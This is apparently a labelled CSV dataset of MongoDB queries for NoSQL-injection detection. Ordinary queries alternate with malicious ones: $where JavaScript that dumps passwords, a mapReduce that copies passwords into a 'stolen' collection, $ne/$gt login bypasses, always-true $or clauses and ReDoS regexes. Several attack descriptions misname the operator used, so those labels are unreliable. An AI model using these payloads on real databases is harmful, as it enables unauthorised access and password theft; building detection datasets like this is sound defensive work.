id,label,type,collection,query,full_command,description,timestamp
2588,benign,insert_query,products,"{""name"": ""Fully-configurable exuding groupware"", ""price"": 617.13, ""category"": ""books"", ""stock"": 665, ""rating"": 2.0, ""brand"": ""\u521b\u4ebf\u4fe1\u606f\u6709\u9650\u516c\u53f8""}","db.products.insertOne({""name"": ""Fully-configurable exuding groupware"", ""price"": 617.13, ""category"": ""books"", ""stock"": 665, ""rating"": 2.0, ""brand"": ""\u521b\u4ebf\u4fe1\u606f\u6709\u9650\u516c\u53f8""})",Document insert operation,2025-11-24T21:15:54.452937
2589,benign,find_with_sort,articles,{},"db.articles.find({}).sort({""created_at"": -1})",Query with sorting,2025-11-24T21:15:54.561147
2590,benign,simple_find,logs,"{""role"": ""user""}","db.logs.find({""role"": ""user""})",Simple field match query,2025-11-24T21:15:54.440087
2591,benign,distinct_query,products,"{""field"": ""category""}","db.products.distinct(""category"")",Field distinct query,2025-11-24T21:15:54.393308
2592,malicious,array_injection,sessions,"{""email.0"": {""$exists"": true}}","db.sessions.find({""email.0"": {""$exists"": true}})",Injection through array operators,2025-11-24T21:15:54.345858
2593,malicious,mapreduce_injection,transactions,"{""mapreduce"": ""transactions"", ""map"": ""function() { emit(this._id, this.password); }"", ""reduce"": ""function(key, values) { db.stolen.insert({data: values}); return 1; }"", ""out"": ""attack_results""}","db.runCommand({""mapreduce"": ""transactions"", ""map"": ""function() { emit(this._id, this.password); }"", ""reduce"": ""function(key, values) { db.stolen.insert({data: values}); return 1; }"", ""out"": ""attack_results""})",Executing malicious JavaScript through MapReduce,2025-11-24T21:15:54.320248
2594,benign,find_with_sort,articles,{},"db.articles.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.362370
2595,benign,find_with_limit,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}).skip(322).limit(55)",Query with pagination,2025-11-24T21:15:54.566215
2596,malicious,regex_injection,transactions,"{""name"": {""$regex"": ""([a-zA-Z]+)*$""}}","db.transactions.find({""name"": {""$regex"": ""([a-zA-Z]+)*$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.301446
2597,malicious,regex_injection,accounts,"{""token"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}}","db.accounts.find({""token"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.349704
2598,benign,find_with_limit,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}).skip(209).limit(44)",Query with pagination,2025-11-24T21:15:54.450334
2599,benign,find_with_projection,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.368202
2600,malicious,comment_injection,logs,"{""$comment"": ""/*"", ""username"": ""*/admin""}","db.logs.find({""$comment"": ""/*"", ""username"": ""*/admin""})",Attempting to bypass filters through comment syntax,2025-11-24T21:15:54.352892
2601,malicious,regex_injection,orders,"{""user_id"": {""$regex"": ""^(?:a+){10,}$""}}","db.orders.find({""user_id"": {""$regex"": ""^(?:a+){10,}$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.333522
2602,benign,aggregation_query,sessions,"[{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}]","db.sessions.aggregate([{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}])",Aggregation pipeline query,2025-11-24T21:15:54.411097
2603,malicious,or_injection,users,"{""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]}","db.users.find({""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.357197
2604,benign,delete_query,users,"{""_id"": ""1228130b-a642-42a2-8e5f-d65f536c32d0""}","db.users.deleteOne({""_id"": ""1228130b-a642-42a2-8e5f-d65f536c32d0""})",Document delete operation,2025-11-24T21:15:54.365713
2605,benign,count_query,users,"{""created_at"": {""$gte"": ""2025-11-15""}}","db.users.countDocuments({""created_at"": {""$gte"": ""2025-11-15""}})",Document count query,2025-11-24T21:15:54.506817
2606,malicious,operator_injection,orders,"{""status"": {""$in"": [""admin"", ""root"", ""administrator""]}}","db.orders.find({""status"": {""$in"": [""admin"", ""root"", ""administrator""]}})",Using $exists operator to bypass authentication or leak data,2025-11-24T21:15:54.338756
2607,malicious,operator_injection,sessions,"{""status"": {""$in"": """"}}","db.sessions.find({""status"": {""$in"": """"}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.300063
2608,benign,update_query,products,"{""filter"": {""_id"": ""ca0841de-3360-4115-88b5-1c880f635f4a""}, ""update"": {""$push"": {""tags"": ""important""}}}","db.products.updateOne({""_id"": ""ca0841de-3360-4115-88b5-1c880f635f4a""}, {""$push"": {""tags"": ""important""}})",Document update operation,2025-11-24T21:15:54.362239
2609,benign,insert_query,orders,"{""order_id"": ""5a9fd637-fc7a-42dc-b05f-aecd2edff02e"", ""user_id"": ""f3dea9dc-469c-458b-896d-036a8092189b"", ""total"": 3509.09, ""status"": ""pending"", ""created_at"": ""2025-11-13T10:26:19.319143"", ""items_count"": 18}","db.orders.insertOne({""order_id"": ""5a9fd637-fc7a-42dc-b05f-aecd2edff02e"", ""user_id"": ""f3dea9dc-469c-458b-896d-036a8092189b"", ""total"": 3509.09, ""status"": ""pending"", ""created_at"": ""2025-11-13T10:26:19.319143"", ""items_count"": 18})",Document insert operation,2025-11-24T21:15:54.389017
2610,benign,find_with_limit,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}).skip(330).limit(66)",Query with pagination,2025-11-24T21:15:54.527263
2611,benign,find_with_limit,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}).skip(413).limit(90)",Query with pagination,2025-11-24T21:15:54.515758
2612,malicious,where_injection,accounts,"{""$where"": ""this.a == this.b || 1==1""}","db.accounts.find({""$where"": ""this.a == this.b || 1==1""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.307250
2613,malicious,aggregation_injection,users,"[{""$match"": {""$where"": ""1==1""}}, {""$out"": ""stolen_data""}]","db.users.aggregate([{""$match"": {""$where"": ""1==1""}}, {""$out"": ""stolen_data""}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.297566
2614,benign,find_with_sort,sessions,{},"db.sessions.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.381522
2615,benign,find_with_projection,logs,"{""status"": ""active""}","db.logs.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.444604
2616,benign,simple_find,customers,"{""status"": ""pending""}","db.customers.find({""status"": ""pending""})",Simple field match query,2025-11-24T21:15:54.392686
2617,benign,simple_find,orders,"{""category"": ""electronics""}","db.orders.find({""category"": ""electronics""})",Simple field match query,2025-11-24T21:15:54.518840
2618,malicious,or_injection,logs,"{""$or"": [{""username"": ""admin""}, {""1"": ""1""}]}","db.logs.find({""$or"": [{""username"": ""admin""}, {""1"": ""1""}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.312341
2619,benign,delete_query,products,"{""status"": ""deleted""}","db.products.deleteOne({""status"": ""deleted""})",Document delete operation,2025-11-24T21:15:54.455382
2620,benign,simple_find,orders,"{""username"": ""jamesanna""}","db.orders.find({""username"": ""jamesanna""})",Simple field match query,2025-11-24T21:15:54.416133
2621,benign,find_with_limit,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}).skip(10).limit(81)",Query with pagination,2025-11-24T21:15:54.490723
2622,malicious,json_injection,orders,"{""username"": ""admin"", ""$or"": [{""1"": ""1""}]}","db.orders.find({""username"": ""admin"", ""$or"": [{""1"": ""1""}]})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.301419
2623,malicious,aggregation_injection,users,"[{""$redact"": {""$cond"": {""if"": true, ""then"": ""$$DESCEND"", ""else"": ""$$PRUNE""}}}]","db.users.aggregate([{""$redact"": {""$cond"": {""if"": true, ""then"": ""$$DESCEND"", ""else"": ""$$PRUNE""}}}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.327487
2624,malicious,where_injection,orders,"{""$where"": ""this.a == this.b || 1==1""}","db.orders.find({""$where"": ""this.a == this.b || 1==1""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.336366
2625,benign,simple_find,sessions,"{""price"": 93.92}","db.sessions.find({""price"": 93.92})",Simple field match query,2025-11-24T21:15:54.405900
2626,benign,find_with_sort,sessions,{},"db.sessions.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.499438
2627,malicious,json_injection,orders,"{""username"": ""admin"", ""$or"": [{""1"": ""1""}]}","db.orders.find({""username"": ""admin"", ""$or"": [{""1"": ""1""}]})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.310995
2628,benign,simple_find,customers,"{""order_id"": ""02c27f97-af6c-4a31-97a9-b67fe35f41db""}","db.customers.find({""order_id"": ""02c27f97-af6c-4a31-97a9-b67fe35f41db""})",Simple field match query,2025-11-24T21:15:54.468722
2629,benign,find_with_limit,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}).skip(166).limit(53)",Query with pagination,2025-11-24T21:15:54.377107
2630,benign,simple_find,users,"{""role"": ""user""}","db.users.find({""role"": ""user""})",Simple field match query,2025-11-24T21:15:54.505225
2631,malicious,comment_injection,logs,"{""$comment"": ""/*"", ""username"": ""*/admin""}","db.logs.find({""$comment"": ""/*"", ""username"": ""*/admin""})",Attempting to bypass filters through comment syntax,2025-11-24T21:15:54.340209
2632,benign,find_with_limit,users,"{""status"": ""active""}","db.users.find({""status"": ""active""}).skip(367).limit(92)",Query with pagination,2025-11-24T21:15:54.453389
2633,malicious,operator_injection,sessions,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.sessions.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.353475
2634,benign,distinct_query,comments,"{""field"": ""role""}","db.comments.distinct(""role"")",Field distinct query,2025-11-24T21:15:54.403551
2635,benign,distinct_query,customers,"{""field"": ""brand""}","db.customers.distinct(""brand"")",Field distinct query,2025-11-24T21:15:54.421064
2636,benign,update_query,comments,"{""filter"": {""_id"": ""d0ffa971-910f-4f44-bec5-2f69ac436e12""}, ""update"": {""$inc"": {""view_count"": 1}}}","db.comments.updateOne({""_id"": ""d0ffa971-910f-4f44-bec5-2f69ac436e12""}, {""$inc"": {""view_count"": 1}})",Document update operation,2025-11-24T21:15:54.472795
2637,malicious,where_injection,customers,"{""$where"": ""this.username == 'admin'""}","db.customers.find({""$where"": ""this.username == 'admin'""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.292789
2638,malicious,regex_injection,users,"{""name"": {""$regex"": ""^(a|a)+$""}}","db.users.find({""name"": {""$regex"": ""^(a|a)+$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.344193
2639,benign,distinct_query,products,"{""field"": ""role""}","db.products.distinct(""role"")",Field distinct query,2025-11-24T21:15:54.550688
2640,benign,find_with_projection,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.386037
2641,benign,find_with_projection,comments,"{""status"": ""active""}","db.comments.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.548062
2642,malicious,operator_injection,orders,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.orders.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Using $ne operator to bypass authentication or leak data,2025-11-24T21:15:54.346888
2643,malicious,or_injection,sessions,"{""$or"": [{""username"": ""admin""}, {""1"": ""1""}]}","db.sessions.find({""$or"": [{""username"": ""admin""}, {""1"": ""1""}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.358107
2644,benign,find_with_limit,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}).skip(142).limit(20)",Query with pagination,2025-11-24T21:15:54.556948
2645,malicious,operator_injection,logs,"{""username"": ""jing70"", ""password"": {""$ne"": """"}}","db.logs.find({""username"": ""jing70"", ""password"": {""$ne"": """"}})",Using $nin operator to bypass authentication or leak data,2025-11-24T21:15:54.335295
2646,benign,simple_find,sessions,"{""_id"": ""df2ef280-3b58-44f5-9118-6c1a854002b0""}","db.sessions.find({""_id"": ""df2ef280-3b58-44f5-9118-6c1a854002b0""})",Simple field match query,2025-11-24T21:15:54.424136
2647,benign,simple_find,comments,"{""role"": ""user""}","db.comments.find({""role"": ""user""})",Simple field match query,2025-11-24T21:15:54.495729
2648,malicious,aggregation_injection,products,"[{""$group"": {""_id"": null, ""passwords"": {""$push"": ""$password""}}}]","db.products.aggregate([{""$group"": {""_id"": null, ""passwords"": {""$push"": ""$password""}}}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.344903
2649,benign,aggregation_query,users,"[{""$match"": {""created_at"": {""$gte"": ""2025-11-19""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}]","db.users.aggregate([{""$match"": {""created_at"": {""$gte"": ""2025-11-19""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}])",Aggregation pipeline query,2025-11-24T21:15:54.381754
2650,benign,simple_find,sessions,"{""category"": ""electronics""}","db.sessions.find({""category"": ""electronics""})",Simple field match query,2025-11-24T21:15:54.524396
2651,malicious,where_injection,users,"{""$where"": ""this.a == this.b || 1==1""}","db.users.find({""$where"": ""this.a == this.b || 1==1""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.337525
2652,malicious,where_injection,users,"{""$where"": ""db.users.find().forEach(function(u){print(u.password)})""}","db.users.find({""$where"": ""db.users.find().forEach(function(u){print(u.password)})""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.288949
2653,malicious,or_injection,logs,"{""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]}","db.logs.find({""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.328612
2654,benign,find_with_sort,comments,{},"db.comments.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.370744
2655,malicious,json_injection,logs,"{""constructor"": {""prototype"": {""admin"": true}}}","db.logs.find({""constructor"": {""prototype"": {""admin"": true}}})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.355016
2656,benign,count_query,logs,"{""category"": ""electronics""}","db.logs.countDocuments({""category"": ""electronics""})",Document count query,2025-11-24T21:15:54.549963
